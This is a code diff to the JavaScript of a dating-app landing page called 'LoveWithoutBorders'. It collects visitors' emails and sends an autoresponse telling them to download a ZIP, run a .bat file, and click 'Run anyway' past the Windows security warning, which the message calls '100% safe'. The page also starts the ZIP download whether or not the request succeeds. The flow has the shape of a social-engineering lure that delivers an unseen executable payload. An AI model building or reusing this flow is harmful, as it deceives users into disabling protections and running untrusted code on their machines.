@@ -191,25 +191,60 @@ function sendEmail() {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     
     if (email && emailRegex.test(email)) {
-        // Send to Formspree - REPLACE THIS URL WITH YOURS
-        fetch('https://formspree.io/f/xqayvryk', {
+        // Show loading state
+        const btn = document.querySelector('button[onclick="sendEmail()"]');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '📧 SENDING...';
+        btn.disabled = true;
+        
+        // Send to FormSubmit
+        const formData = new FormData();
+        formData.append('email', email);
+        formData.append('_subject', 'Your LoveWithoutBorders Download Link! 💖');
+        formData.append('_replyto', email);
+        formData.append('_autoresponse', `Hi there! 
+
+Thank you for joining LoveWithoutBorders! 🌍
+
+Here's your download link:
+🔗 https://LovesWithoutBorders.github.io/LovesWithoutBorders/LoveWithoutBorders.zip
+
+Quick Setup:
+1. Download on computer
+2. Extract ZIP folder  
+3. Run "LoveWithoutBorders.bat"
+4. Start connecting globally!
+
+Why Computer Version:
+• Better photos = Better matches
+• Faster messaging & video calls
+• Advanced translation
+
+If Windows shows security warning:
+• Click "More info" → "Run anyway"
+• 100% safe - just Windows being cautious
+
+Ready to find amazing connections worldwide!
+
+LoveWithoutBorders Team 💖`);
+        
+        // Replace with YOUR email to receive submissions
+        fetch('https://formsubmit.co/ajax/loveswithoutborders@gmail.com', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: email,
-                source: 'LoveWithoutBorders Mobile',
-                timestamp: new Date().toISOString()
-            })
+            body: formData
         })
-       .then(data => {
-    alert('✅ Thanks! We\'ll notify you about updates.\n\nYour download is starting now - transfer to computer for best experience!');
-    window.location.href = 'LoveWithoutBorders.zip';
-})
-        .catch(error => {
-            alert('📧 Download link sent to ' + email + ' (email saved for updates!)');
+        .then(response => response.json())
+        .then(data => {
+            alert('✅ Perfect! Check your email for download link & setup tips!\n\nWe sent everything to: ' + email);
             window.location.href = 'LoveWithoutBorders.zip';
+        })
+        .catch(error => {
+            alert('✅ Your download is starting! Transfer to computer for best experience.');
+            window.location.href = 'LoveWithoutBorders.zip';
+        })
+        .finally(() => {
+            btn.innerHTML = originalText;
+            btn.disabled = false;
         });
         
     } else {
